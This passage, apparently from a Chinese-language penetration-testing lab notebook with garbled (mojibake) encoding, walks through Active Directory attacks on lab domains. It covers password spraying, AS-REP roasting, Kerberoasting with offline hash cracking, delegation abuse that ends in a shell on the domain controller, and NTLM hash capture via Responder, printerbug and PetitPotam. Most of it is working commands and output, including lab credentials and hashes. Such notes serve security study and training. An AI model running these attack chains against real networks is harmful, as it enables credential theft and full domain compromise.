â””â”€# crackmapexec smb 192.168.2.15 -u user.list -p pass.list --no-bruteforce --continue-on-success
SMB         192.168.2.15    445    OWA2010CN-GOD    [*] Windows Server 2008 R2 Datacenter 7601 Service Pack 1 x64 (name:OWA2010CN-GOD) (domain:god.org) (signing:True) (SMBv1:True)
SMB         192.168.2.15    445    OWA2010CN-GOD    [+] god.org\administrator:Admin12345 (Pwn3d!)
SMB         192.168.2.15    445    OWA2010CN-GOD    [+] god.org\webadmin:admin!@#45 (Pwn3d!)
SMB         192.168.2.15    445    OWA2010CN-GOD    [-] god.org\xxxxxxxxxxx:xxxxxxxxxx STATUS_LOGON_FAILURE 
```

3ã€pyKerbrute

4ã€DomainPasswordSprat.ps1  [GitHub - dafthack/DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)



### æŠ“åŒ…åˆ†æ

<img src=".\å›¾ç‰‡\Snipaste_2023-09-20_20-59-52.png" alt="Snipaste_2023-09-20_20-59-52" style="zoom:80%;" />



## AS-REP Roasting

åœ¨ä¸åŸŸæ§è®¾ç½® â€œ **ä¸è¦æ±‚ Kerberos é¢„èº«ä»½éªŒè¯** â€œ çš„è´¦æˆ·æ—¶ï¼Œå‘ç”Ÿåœ¨ Kerberos èº«ä»½éªŒè¯çš„ç¬¬ä¸€é˜¶æ®µ (AS_REQ&AS_REP) æ—¶ï¼Œæ”»å‡»è€…è¯·æ±‚ç¥¨æ®æ—¶ï¼Œ**åŸŸæ§ä¸ä¼šè¿›è¡Œèº«ä»½éªŒè¯ä¾¿ç›´æ¥æŠŠ TGT å’Œè¯¥ç”¨æˆ·çš„ Hash åŠ å¯†çš„ Login Session Key è¿”å›**ï¼Œæ”»å‡»è€…å¯ç¦»çº¿ç ´è§£ 



### é…ç½®

<img src=".\å›¾ç‰‡\Snipaste_2023-09-20_21-10-14.png" alt="Snipaste_2023-09-20_21-10-14" style="zoom:67%;" />



### è·å– Hash

1ã€Rubeus

```powershell
PS C:\Users\Administrator\Desktop> .\Rubeus.exe asreproast /format:john /outfile:hash.txt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4


[*] Action: AS-REP roasting

[*] Target Domain          : god.org

[*] Searching path 'LDAP://OWA2010CN-God.god.org/DC=god,DC=org' for AS-REP roastable users
[*] SamAccountName         : dbadmin
[*] DistinguishedName      : CN=dbadmin,CN=Users,DC=god,DC=org
[*] Using domain controller: OWA2010CN-God.god.org (fe80::c4fb:77be:1c52:ea3c%14)
[*] Building AS-REQ (w/o preauth) for: 'god.org\dbadmin'
[+] AS-REQ w/o preauth successful!
[*] Hash written to C:\Users\Administrator\Desktop\hash.txt

[*] Roasted hashes written to : C:\Users\Administrator\Desktop\hash.txt
```

ç ´è§£ Hashï¼š

```bash
â””â”€# john --wordlist=/root/pass.list hash.txt 
admin!@#45       ($krb5asrep$dbadmin@god.org)   
```

2ã€ASREPRoast.ps1

[GitHub - HarmJ0y/ASREPRoast.](https://github.com/HarmJ0y/ASREPRoast)

3ã€GetNPUsers.py

å½“å¯¹äºéåŸŸå†…æœºå™¨ï¼Œä¸Šè¿°æ–¹æ³•å°±ä¸é€‚ç”¨

å¯ä»¥ä½¿ç”¨ Adfind æŸ¥è¯¢ä¸éœ€è¦è¿›è¡ŒåŸŸèº«ä»½éªŒè¯çš„è´¦å·

```bash
PS C:\Users\Administrator\Desktop> .\AdFind.exe -h 192.168.2.15:389 god\webadmin up admin!@#45 -f "useraccountcontrol:1.
2.840.113556.1.4.803:=4194304" -dn

AdFind V01.56.00cpp Joe Richards (support@joeware.net) April 2021

Using server: OWA2010CN-God.god.org:389
Directory: Windows Server 2008 R2
Base DN: DC=god,DC=org

dn:CN=dbadmin,CN=Users,DC=god,DC=org
```

æ¥ç€ä½¿ç”¨ GetNPUsers.py å¯ä»¥ä½¿ç”¨ç”¨æˆ·åå­—å…¸è¿›è¡Œæšä¸¾ï¼Œå­˜åœ¨ä¸éœ€è¦è¿›è¡ŒåŸŸèº«ä»½éªŒè¯çš„è´¦å·æ—¶ç›´æ¥è¿”å› Hash åŠ å¯†çš„ Login Session Key

```bash
GetNPUsers.py -dc-ip 192.168.2.15 -userfile user.list -format john god.org/
```

```bash
â””â”€# GetNPUsers.py -dc-ip 192.168.2.15 -usersfile user.list -format john god.org/
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User webadmin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$dbadmin@GOD.ORG:c46fa564a9bd0595fb73153f98cc9492$729db0e30b14c4e15c9f806efe00e581a7f4ec7ae010a2fe0cc764335663940088c596224017fd13976e376714235acb8750e8df9472474630f03a5fa27204bada49f6904f6fc12986039304945a25745aa50bbef292842f817bb1803a05fb0d9cc6b1e1bace290eeb7add04a0239eb44032521163f84a2416a35d29ef926efadfe86c87afb669b7bf0251bf8a7108713f68f82a755d2df34a03f607f15098acbc55e703be3f2fa1ef97ec8b789c01b0b6b4deda99e17d486953b412f0b69a9e222c805d6ba701cc3d23c1261faaadb35a8f22a8fa8d6714ae464977c52251a5113f
```



### ç ´è§£æŠ€å·§

ç”¨ john ç›´æ¥ç ´è§£

```bash
john --wordlist=/root/pass.list hash.txt 
```

ç”¨ hashcat æ—¶ï¼Œè¦æ‰‹åŠ¨è°ƒæ•´ Hash ï¼ŒæŠŠ `$23` åŠ åˆ°æ­£æ•°ç¬¬äºŒä¸ª $ å‰é¢ï¼Œå†

```bash
hashcat -m 18200 hash.txt pass.txt --force
```



### æŠ“åŒ…åˆ†æ

å…ˆçœ‹æˆ‘ä»¬çš„ ç”¨æˆ·å å­—å…¸ user.list ï¼Œæ³¨æ„é¡ºåº

```bash
â””â”€# cat user.list 
administrator
webadmin
xxxxxxxxxxx
dbadmin
```

<img src=".\å›¾ç‰‡\Snipaste_2023-09-20_21-51-37.png" alt="Snipaste_2023-09-20_21-51-37" style="zoom:80%;" />

dbadmin ç”¨æˆ·çš„ AS-REP åŒ…ï¼š

<img src=".\å›¾ç‰‡\Snipaste_2023-09-20_21-54-06.png" alt="Snipaste_2023-09-20_21-54-06" style="zoom:80%;" />



## Kerberoasting

å‘ç”Ÿåœ¨ Kerberos åè®®çš„ **TGS-REP é˜¶æ®µ**ï¼Œ KDC çš„ TGS æœåŠ¡è¿”å›ä¸€ä¸ªç”±æœåŠ¡ Hash åŠ å¯†çš„ ST ç»™å®¢æˆ·ç«¯ã€‚è¿™ä¸ª ST é‡Œå­˜åœ¨ SPN é“¾æ¥ç”¨æˆ·çš„ æ˜æ–‡å¯†ç ï¼Œå¦‚æœæ˜¯ **RC4_HMAC_MD5** åŠ å¯†çš„ï¼Œå°±å¯ç ´è§£ã€‚

åˆ©ç”¨è¿‡ç¨‹ä¸»è¦åˆ†ä¸ºå››æ­¥ï¼š

1. æŸ¥è¯¢åŸŸå†…æ³¨å†Œåœ¨åŸŸç”¨æˆ·ä¸‹çš„ SPN
2. è¯·æ±‚æŒ‡å®š SPN çš„ ST
3. å¯¼å‡º è¯·æ±‚çš„ ST
4. å¯¹å¯¼å‡º ST è¿›è¡Œç¦»çº¿ç ´è§£

### æ­¥éª¤

#### 1ã€SPNçš„å‘ç°

å·¥å…·1ï¼šRiskySPNï¼š[GitHub - cyberark/RiskySPN: Detect and abuse risky SPNs](https://github.com/cyberark/RiskySPN)

```powershell
. .\Find-PotentiallyCrackableAccounts.ps1
Find-PotentiallyCrackableAccounts -FullData
```

```powershell
UserName        : webadmin
DomainName      : god.org
IsSensitive     : True
EncType         : RC4-HMAC
Description     :
IsEnabled       : True
IsPwdExpires    : False
PwdAge          : 1620
CrackWindow     : Indefinitely
SensitiveGroups :
MemberOf        :
DelegationType  : Protocol Transition
TargetServices  : {cifs/OWA2010CN-God.god.org/god.org, cifs/OWA2010CN-God.god.org, cifs/OWA2010CN-GOD, cifs/OWA2010CN-G
                  od.god.org/GOD...}
NumofServers    :
RunsUnder       : {@{Service=priv; Server=test; IsAccessible=No}}
AssociatedSPNs  : {priv/test}
```



å·¥å…·2ï¼šGetUserSPNs

[GitHub - nidem/kerberoast](https://github.com/nidem/kerberoast)

```powershell
PS C:\Users\Administrator\Desktop> .\GetUserSPNs.ps1


ServicePrincipalName : kadmin/changepw
Name                 : krbtgt
SAMAccountName       : krbtgt    # krbtgt ç”¨æˆ·æ— æ³•åˆ©ç”¨ï¼Œå¯å¿½ç•¥
MemberOf             : CN=Denied RODC Password Replication Group,CN=Users,DC=god,DC=org
PasswordLastSet      : 2018/12/22 16:28:32

ServicePrincipalName : priv/test
Name                 : webadmin
SAMAccountName       : webadmin
MemberOf             :
PasswordLastSet      : 2019/4/14 17:29:33



PS C:\Users\Administrator\Desktop> .\GetUserSPNs.vbs
```



å·¥å…·3ï¼šPowerView.ps1

```powershell
PS C:\Users\Administrator\Desktop> . .\PowerView.ps1
PS C:\Users\Administrator\Desktop> Get-Netuser -SPN
```



#### 2ã€è¯·æ±‚æœåŠ¡ç¥¨æ®

å·¥å…·1ï¼š `GetUserSPNs.py`

è¯·æ±‚æ³¨å†Œåœ¨ç”¨æˆ·ä¸‹çš„æ‰€æœ‰ SPN æœåŠ¡ç¥¨æ®ï¼Œå¹¶ä¿å­˜ä¸º hash.txt

```bash
â””â”€# GetUserSPNs.py -request -dc-ip 192.168.2.15 god.org/webadmin:admin\!\@\#45 -outputfile hash.txt
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name      MemberOf  PasswordLastSet             LastLogon                   Delegation  
--------------------  --------  --------  --------------------------  --------------------------  -----------
priv/test             webadmin            2019-04-14 05:29:33.303878  2023-09-20 08:55:04.214408  constrained 
```

è¯·æ±‚ç‰¹å®šç”¨æˆ· webadmin ä¸‹çš„ SPN æœåŠ¡ç¥¨æ®ï¼Œå¹¶ä¿å­˜ä¸º hash.txtï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨ bash è„šæœ¬å¾ªç¯ ç”¨æˆ·å æšä¸¾ç¥¨æ®

```bash
â””â”€# GetUserSPNs.py -request -dc-ip 192.168.2.15 god.org/webadmin:admin\!\@\#45 -outputfile hash.txt -request-user webadmin
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name      MemberOf  PasswordLastSet             LastLogon                   Delegation  
--------------------  --------  --------  --------------------------  --------------------------  -----------
priv/test             webadmin            2019-04-14 05:29:33.303878  2023-09-20 10:30:54.241291  constrained 
```

å·¥å…·2ï¼šRubeus è¯·æ±‚

```powershell
.\Rubeus.exe kerberoast /format:john /outfile:hash.txt
```

```
.\Rubeus.exe kerberoast /format:john /outfile:hash.txt /spn:priv/test
```

å·¥å…·3ï¼šmimikatz è¯·æ±‚

```powershell
mimikatz kerberos::ask /target:priv/test
```



#### 3ã€å¯¼å‡ºç¥¨æ®

```powershell
.\mimikatz "kerberos::list /export" "exit"
```

æŸ¥çœ‹å†…å­˜ä¸­çš„ç¥¨æ®

```
klist
```

```
kerberos::list
```

```powershell
PS C:\Users\Administrator\Desktop> klist

Current LogonId is 0:0x2d006

Cached Tickets: (2)

#0>     Client: administrator @ GOD.ORG
        Server: krbtgt/GOD.ORG @ GOD.ORG
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 9/21/2023 16:37:31 (local)
        End Time:   9/22/2023 2:37:31 (local)
        Renew Time: 9/28/2023 16:37:31 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)


#1>     Client: administrator @ GOD.ORG
        Server: priv/test @ GOD.ORG
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 9/21/2023 16:50:57 (local)
        End Time:   9/22/2023 2:37:31 (local)
        Renew Time: 9/28/2023 16:37:31 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
```



#### 4ã€ç¦»çº¿ç ´è§£ç¥¨æ®

å·¥å…·1ï¼šjohn

```bash
â””â”€# john --format=krb5tgs ../hash.txt --wordlist=../pass.list      
```

```
admin!@#45       (?)     
```



å·¥å…·2ï¼šhashcat

```bash
hashcat -13100 hash.txt pass.txt --force 
```



å·¥å…·3ï¼škerberoastï¼Œç ´è§£çš„æ˜¯ `.kirbi` æ ¼å¼ï¼Œå¯ç”¨å·¥å…·4è½¬åŒ–ä¸ºå…¶å®ƒæ ¼å¼

[GitHub - nidem/kerberoast](https://github.com/nidem/kerberoast)

```bash
python3 tgsrepcrack.py  password.txt 1-40a00000-administrator@priv~test-GOD.ORG.kirbi
```

```
admin!@#45
```



å·¥å…·4ï¼štgscrack.go  

[GitHub - leechristensen/tgscrack: Kerberos TGS_REP cracker written in Golang](https://github.com/leechristensen/tgscrack)



è¡¥å……ï¼š[åŸŸæ¸—é€å…¥é—¨ï¼ˆå››ï¼‰KerberoastingæœåŠ¡ç¥¨æ®ç¦»çº¿çˆ†ç ´å¯†ç  - whale3070's blog](https://whale3070.github.io/2020/05/04/09-x/#å½•åˆ¶çš„è§†é¢‘æ•™ç¨‹)

kirbi2john.py å°†å¯¼å‡ºçš„ 1.kirbi è½¬æ¢ä¸º hashcat å¯ä»¥ç ´è§£çš„æ ¼å¼

```bash
python /usr/share/john/kirbi2john.py 2-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi > output.txt
```



### æŠ“åŒ…åˆ†æ

æ–¹å¼ï¼š

```bash
GetUserSPNs.py -request -dc-ip 192.168.2.9 god.org/webadmin:admin\!\@\#45 -outputfile hash.txt -request-user webadmin
```



ä»¥ä¸‹çš„ etype æ˜¯ä¸å®‰å…¨çš„ åŠ å¯†æ–¹å¼

<img src=".\å›¾ç‰‡\Snipaste_2023-09-21_17-10-43.png" alt="Snipaste_2023-09-21_17-10-43" style="zoom:80%;" />





## å§”æ´¾

### éçº¦æŸå§”æ´¾

#### æŸ¥è¯¢

Adfindï¼š

```bash
#ä¸»æœº
AdFind.exe -b "DC=redteam,DC=red" -f "(&(samAccountType=805306369) (userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName
#æœåŠ¡è´¦æˆ·
AdFind.exe -b "DC=redteam,DC=red" -f "(&(samAccountType=805306368) (userAccountControl:1.2.840.113556.1.4.803:=524288))" cn distinguishedName
```

```bash
#ä¸»æœº
AdFind.exe -b "DC=redteam,DC=red" -f "(&(samAccountType=805306369) (userAccountControl:1.2.840.113556.1.4.803:=524288))" -dn
#æœåŠ¡è´¦æˆ·
AdFind.exe -b "DC=redteam,DC=red" -f "(&(samAccountType=805306368) (userAccountControl:1.2.840.113556.1.4.803:=524288))" -dn
```

PowerSploit ä¸‹çš„ PowerView.ps1ï¼š

```powershell
Import-Module .\PowerView.ps1
Get-NetComputer -Unconstrained -Domain redteam.red
Get-NetUser -Unconstrained -Domain redteam.red | select name
```

Ldapsearchï¼š

æŸ¥æœåŠ¡è´¦æˆ·ï¼š

```bash
ldapsearch -x -H ldap://10.211.1.210:389 -D "CN=win7,CN=Users,DC=relaysec,DC=com" -w Admin123.. -b "DC=relaysec,DC=com" "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" | grep -iE "distinguishedName"
```

```bash
ldapsearch -x -H ldap://10.211.1.210:389 -D "hack@xie.com" -w Admin123.. -b "DC=xie,DC=com" "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))" | grep dn
```

æŸ¥ä¸»æœºï¼š

```powershell
ldapsearch -x -H ldap://10.211.1.210:389 -D "hack@xie.com" -w Admin123.. -b "DC=xie,DC=com" "(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))" | grep dn
```





### çº¦æŸå§”æ´¾

#### æŸ¥è¯¢

Adfindï¼š

```powershell
#æŸ¥ä¸»æœº
AdFind -b "DC=redteam,DC=red" -f "(&(samAccountType=805306369)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto
#æŸ¥æœåŠ¡è´¦æˆ·
AdFind -b "DC=redteam,DC=red" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto
```

PowerView:

```powershell
#æŸ¥æœåŠ¡è´¦æˆ·
Get-DomainUser â€“TrustedToAuth -domain redteam.red -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|fl
#æŸ¥æœºå™¨
Get-DomainComputer -TrustedToAuth -Domain redteam.red -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize
```

Ldapsearchï¼š

```bash
#æŸ¥æ‰¾åŸŸä¸­é…ç½®çº¦æŸå§”æ´¾ç”¨æˆ·
ldapsearch -x -H ldap://172.16.25.242:389 -D "CN=user0x1,CN=Users,DC=networksec,DC=loacl" -w q123456. -b "DC=networksec,DC=loacl" "(&(samAccountType=805306368)(msds- allowedtodelegateto=*))" |grep -iE "distinguishedName|allowedtodelegateto"

#æŸ¥æ‰¾åŸŸä¸­é…ç½®çº¦æŸå§”æ´¾çš„ä¸»æœºï¼š
ldapsearch -x -H ldap://172.16.25.242:389 -D "CN=user0x2,CN=Users,DC=networksec,DC=loacl" -w q123456. -b "DC=networksec,DC=loacl" "(&(samAccountType=805306369)(msds- allowedtodelegateto=*))" |grep -iE "distinguishedName|allowedtodelegateto"
```





### åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾

#### æŸ¥è¯¢

æŸ¥è¯¢å“ªäº›åŸŸå†…æœºå™¨æ˜¯ç”±åŒä¸€ä¸ªç”¨æˆ·åŠ å…¥çš„

```powershell
AdFind.exe -h 192.168.2.13 -b "DC=redteam,DC=red" -f "objectClass=computer" mS-DS-CreatorSID
sid2user.exe \\192.168.2.13 5 21 1695257952 3088263962 2055235443 1104  # åé¢å‚æ•°æ˜¯è¯¥ç”¨æˆ·çš„ SID
```

PowerViewï¼š

```powershell
Get-ObjectAcl -SamAccountName "username" -ResolveGUIDs | out-file save.txt
```



æŸ¥è¯¢æŸä¸ªè´¦æˆ·æ˜¯å¦å…·æœ‰å§”æ´¾æ€§

PowerView.ps1ï¼š

```powershell
Import-Module .\PowerView.ps1

#æŸ¥çœ‹éçº¦æŸæ€§å’Œçº¦æŸæ€§å§”æ´¾
Get-DomainUser åŸŸè´¦æˆ·å -Properties useraccountcontrol,msds-allowedtodelegateto | fl
Get-DomainComputer æœºå™¨è´¦æˆ·å -Properties useraccountcontrol,msds-allowedtodelegateto | fl

#æŸ¥çœ‹åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾
Get-DomainUser åŸŸè´¦æˆ·å -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
Get-DomainComputer æœºå™¨è´¦æˆ·å -Properties msDS-AllowedToActOnBehalfOfOtherIdentity 
```

å½“è¯¥è´¦æˆ·æ²¡æœ‰å§”æ´¾å±æ€§æ—¶ï¼Œåªæœ‰ userAccountControl å±æ€§æœ‰å€¼

- æœåŠ¡è´¦æˆ·çš„å€¼ä¸º NORMAL_ACCOUNT

- æœºå™¨è´¦æˆ·çš„å€¼ä¸º WORKSTATION_TRUST_ACCOUNT



### å®éªŒ1ï¼šéçº¦æŸå§”æ´¾

æŸ¥è¯¢éçº¦æŸå§”æ´¾çš„æœºå™¨ï¼Œä¸º `sqlserver-2008`

```powershell
Import-Module .\PowerView.ps1
Get-NetComputer -Unconstrained -Domain redteam.red
```

æ­£å¸¸æƒ…å†µä¸‹åœ¨ `sqlserver-2008` ä¸Šè®¿é—®åŸŸæ§ä¸ºæ‹’ç»

```
C:\Users\sqlserver>dir \\owa.redteam.red\c$
æ‹’ç»è®¿é—®ã€‚
```

æ­¤æ—¶è¯±æƒ‘åŸŸæ§è¿æ¥ sqlserver-2008 

```
net use \\sqlserver-2008.redteam.red 
```

æ¥ç€åœ¨ sqlserver-2008 è¿™å°æœºå™¨ä¸Šç”¨ ç®¡ç†å‘˜æƒé™è¿è¡Œ mimkatzï¼Œå¹¶ä¸”å¯¼å‡ºç¥¨æ®

```
privilege::debug
sekurlsa::tickets /export
```

ä¼šå‘ç°å¯¼å‡ºäº†å¾ˆå¤šç¥¨æ®ï¼Œæˆ‘ä»¬æŠŠ administrator åŸŸæ§çš„ç¥¨æ®å¯¼å…¥åˆ°å†…å­˜ï¼Œè¿™æ—¶å€™å¾—ç”¨ sqlserver-2008 ä¸Šçš„æ™®é€šåŸŸç”¨æˆ· sqlserver æ¥è¿è¡Œ mimikatz å¯¼å…¥åŸŸæ§çš„ç¥¨æ®

<img src=".\å›¾ç‰‡\Snipaste_2023-09-22_19-34-55.png" alt="Snipaste_2023-09-22_19-34-55" style="zoom:67%;" />

```
kerberos::ptt [0;8e5d5]-2-0-60a00000-Administrator@krbtgt-REDTEAM.RED.kirbi
```

å† sqlserver-2008 æ¥è¿æ¥åŸŸæ§

<img src=".\å›¾ç‰‡\Snipaste_2023-09-22_20-06-30.png" alt="Snipaste_2023-09-22_20-06-30" style="zoom:80%;" />



è¿˜å¯ä»¥é…åˆæ‰“å°æœºæ¼æ´ä¸€èµ·åˆ©ç”¨ï¼Œè¿™é‡Œçš„å¥½å¤„æ˜¯ä¸ç”¨è¯±æƒ‘åŸŸæ§æ¥è¿æ¥æˆ‘ä»¬ï¼Œä½¿ç”¨æ‰“å°æœºæ¼æ´å¯ä»¥åœ¨ sqlserver-2008 é‡Œè¿è¡Œè„šæœ¬ä½¿åŸŸæ§å¼ºåˆ¶è®¿é—® sqlserver-2008ï¼Œè¿™æ ·åˆ©ç”¨é¢ä¾¿æ›´å¹¿äº†



### å®éªŒ2ï¼šçº¦æŸå§”æ´¾

æŸ¥è¯¢é…ç½®äº†çº¦æŸå§”æ´¾çš„æœåŠ¡è´¦æˆ·å’Œ è¢«å§”æ´¾çš„ spn

```
AdFind -b "DC=redteam,DC=red" -f "(&(samAccountType=805306368)(msds-allowedtodelegateto=*))" msds-allowedtodelegateto
```

```
C:\Users\sqlserver\Desktop>AdFind -b "DC=redteam,DC=red" -f "(&(samAccountType=805306368)(msds-allow
edtodelegateto=*))" msds-allowedtodelegateto

AdFind V01.52.00cpp Joe Richards (support@joeware.net) January 2020

Using server: owa.redteam.red:389
Directory: Windows Server 2008 R2

dn:CN=sqlserver,CN=Users,DC=redteam,DC=red
>msDS-AllowedToDelegateTo: cifs/owa.redteam.red/redteam.red
>msDS-AllowedToDelegateTo: cifs/owa.redteam.red
>msDS-AllowedToDelegateTo: cifs/OWA
>msDS-AllowedToDelegateTo: cifs/owa.redteam.red/REDTEAM
>msDS-AllowedToDelegateTo: cifs/OWA/REDTEAM


1 Objects returned
```

å†åˆ° kali é‡Œç»‘å®š hosts

```bash
echo '192.168.2.15 owa.redteam.red redteam.red' >> /etc/hosts
```

å†åˆ° kali é‡Œæ“ä½œï¼š

```bash
# ä»¥ test èº«ä»½ç”³è¯·ä¸€å¼ è®¿é—®  cifs/owa.redteam.red çš„æœåŠ¡ç¥¨æ®
getST.py -dc-ip 192.168.2.15 redteam.red/sqlserver:Server12345 -spn cifs/owa.redteam.red  -impersonate administrator
# å¯¼å…¥ç¥¨æ®
export KRB5CCNAME=administrator.ccache
# è¿œç¨‹è®¿é—®åŸŸæ§
smbexec.py -no-pass -k owa.redteam.red
```

```bash
â””â”€# smbexec.py -no-pass -k owa.redteam.red -codec gbk  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>ipconfig

Windows IP é…ç½®


ä»¥å¤ªç½‘é€‚é…å™¨ æœ¬åœ°è¿æ¥ 3:

   è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . : 
   æœ¬åœ°é“¾æ¥ IPv6 åœ°å€. . . . . . . . : fe80::e516:9d12:5f9f:7342%20
   IPv4 åœ°å€ . . . . . . . . . . . . : 192.168.2.15
   å­ç½‘æ©ç   . . . . . . . . . . . . : 255.255.255.0
   é»˜è®¤ç½‘å…³. . . . . . . . . . . . . : fe80::100%20
                                       192.168.2.1

ä»¥å¤ªç½‘é€‚é…å™¨ æœ¬åœ°è¿æ¥:

   è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . : 
   æœ¬åœ°é“¾æ¥ IPv6 åœ°å€. . . . . . . . : fe80::c06e:7d8c:89dd:2b63%11
   IPv4 åœ°å€ . . . . . . . . . . . . : 10.10.10.8
   å­ç½‘æ©ç   . . . . . . . . . . . . : 255.255.255.0
   é»˜è®¤ç½‘å…³. . . . . . . . . . . . . : 10.10.10.1

éš§é“é€‚é…å™¨ isatap.{93029FBE-D5D9-4FBA-A992-68F5E9EC7241}:

   åª’ä½“çŠ¶æ€  . . . . . . . . . . . . : åª’ä½“å·²æ–­å¼€
   è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . : 

éš§é“é€‚é…å™¨ isatap.{F00E4250-A4BD-4325-AAFA-C4AD46F43082}:

   åª’ä½“çŠ¶æ€  . . . . . . . . . . . . : åª’ä½“å·²æ–­å¼€
   è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . : 
```



## NTML Relay

ä¸­é—´äººæ”»å‡»ï¼Œå¯ä»¥ç±»ä¼¼äº arp æ¯’åŒ–



### æ•è· Net-NTML Hash

Responder çš„ç”¨æ³•

```bash
Usage: responder -I eth0 -w -d
or:
responder -I eth0 -wd

Options:
  --version             show program's version number and exit
  -h, --help            show this help message and exit
  -A, --analyze         Analyze mode. This option allows you to see NBT-NS,
                        BROWSER, LLMNR requests without responding.
  -I eth0, --interface=eth0
                        Network interface to use, you can use 'ALL' as a
                        wildcard for all interfaces
  -i 10.0.0.21, --ip=10.0.0.21
                        Local IP to use (only for OSX)
  -6 2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed, --externalip6=2002:c0a8:f7:1:3ba8:aceb:b1a9:81ed
                        Poison all requests with another IPv6 address than
                        Responder's one.
  -e 10.0.0.22, --externalip=10.0.0.22
                        Poison all requests with another IP address than
                        Responder's one.
  -b, --basic           Return a Basic HTTP authentication. Default: NTLM
  -d, --DHCP            Enable answers for DHCP broadcast requests. This
                        option will inject a WPAD server in the DHCP response.
                        Default: False
  -D, --DHCP-DNS        This option will inject a DNS server in the DHCP
                        response, otherwise a WPAD server will be added.
                        Default: False
  -w, --wpad            Start the WPAD rogue proxy server. Default value is
                        False
  -u UPSTREAM_PROXY, --upstream-proxy=UPSTREAM_PROXY
                        Upstream HTTP proxy used by the rogue WPAD Proxy for
                        outgoing requests (format: host:port)
  -F, --ForceWpadAuth   Force NTLM/Basic authentication on wpad.dat file
                        retrieval. This may cause a login prompt. Default:
                        False
  -P, --ProxyAuth       Force NTLM (transparently)/Basic (prompt)
                        authentication for the proxy. WPAD doesn't need to be
                        ON. This option is highly effective. Default: False
  --lm                  Force LM hashing downgrade for Windows XP/2003 and
                        earlier. Default: False
  --disable-ess         Force ESS downgrade. Default: False
  -v, --verbose         Increase verbosity.
```



#### 1ã€LLMNR&NBNSåè®® æ”»å‡»ç¤ºä¾‹

Responder ç›‘å¬

```bash
â”€# responder -I eth0 -wd
```

åŸŸæ§è§¦å‘ï¼š

<img src=".\å›¾ç‰‡\Snipaste_2023-09-22_21-53-10.png" alt="Snipaste_2023-09-22_21-53-10" style="zoom:80%;" />

<img src=".\å›¾ç‰‡\Snipaste_2023-09-22_21-54-02.png" alt="Snipaste_2023-09-22_21-54-02" style="zoom:80%;" />

Responderç›‘å¬åˆ° NTLMV2 Hash

```bash
[WebDAV] NTLMv2 Client   : 192.168.2.15
[WebDAV] NTLMv2 Username : REDTEAM\Administrator
[WebDAV] NTLMv2 Hash     : Administrator::REDTEAM:430c49c0624b6237:0896CB0620C6C1231CC1C8FC984E4C18:01010000000000004F450D385CEDD901E7A7EE41B765BA6800000000020008004900570051004F0001001E00570049004E002D004F003200570032003400520043005A00430046005900040014004900570051004F002E004C004F00430041004C0003003400570049004E002D004F003200570032003400520043005A004300460059002E004900570051004F002E004C004F00430041004C00050014004900570051004F002E004C004F00430041004C000800300030000000000000000000000000300000F2C1FC1C12A6B87C37332DBF4FD121787AB3F11F4B4F93ECCA32634B6CCC78F30A0010000000000000000000000000000000000009001E0048005400540050002F007A007A007A007A007A007A007A007A007A007A000000000000000000
```



#### 2ã€æ‰“å°æœºæ¼æ´

å°±æ˜¯è®©æ‰“å°æœºå¼ºåˆ¶å¯¹ æ”»å‡»è€… 192.168.2.14 è¿›è¡Œ NTLM éªŒè¯                [printerbug](https://github.com/dirkjanm/krbrelayx/tree/master)

```bash
python printerbug.py redteam/sqlserver:Server12345@192.168.2.15 192.168.2.14
```

åŒæ · Responder ç›‘å¬



#### 3ã€PetitPotam

[GitHub - topotam/PetitPotam.](https://github.com/topotam/PetitPotam)

```bash
â””â”€# python PetitPotam.py -d redteam.red -u sqlserver -p Server12345 192.168.2.14 192.168.2.15

                                                                                               
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
